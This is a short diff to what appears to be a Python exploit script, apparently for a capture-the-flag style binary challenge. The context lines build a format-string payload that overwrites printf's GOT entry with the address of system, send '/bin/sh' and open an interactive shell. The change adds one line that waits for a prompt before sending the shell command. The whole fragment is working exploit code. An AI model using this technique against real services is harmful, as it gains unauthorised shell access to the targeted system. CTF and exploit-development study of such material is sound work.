@@ -39,6 +39,7 @@ f[printf_got] = system_plt
 f[printf_got + 4] = 0
 p.recvuntil("$ ")
 p.sendline(f.payload(12))
+p.recvuntil("$ ")
 p.sendline("/bin/sh")
 
 p.interactive()
